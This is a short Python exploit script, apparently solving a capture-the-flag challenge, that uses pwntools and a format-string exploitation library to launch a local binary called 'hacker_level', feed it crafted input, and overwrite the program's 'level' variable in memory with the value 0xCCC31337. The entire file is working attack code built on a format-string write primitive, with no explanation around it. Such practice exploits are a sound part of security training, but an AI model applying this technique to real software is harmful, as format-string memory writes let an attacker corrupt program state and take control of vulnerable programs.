#!/usr/bin/env python

from formatStringExploiter.FormatString import FormatString
from pwn import *

def exec_fmt(s,echo=True):
    #  Open up pwntool process class to interact with application
    p = process("./hacker_level",buffer_fill_size=0xffff)
    # Go ahead and send our input
    p.sendline(s)
    # Throw out data that we know to be before our results
    p.recvuntil("Hello, ",drop=True)
    # We could do better here, but why? Just grab all the rest of the data.
    out = p.recvall()
    # For diagnostic reasons, we can print out the output
    if echo:
        print(out)
    # Since we're running this every time, close out the proc.
    p.close()
    return out
    
elf = ELF("./hacker_level")

fmtStr = FormatString(exec_fmt,elf=elf)

fmtStr.write_d(elf.symbols['level'],0xCCC31337)

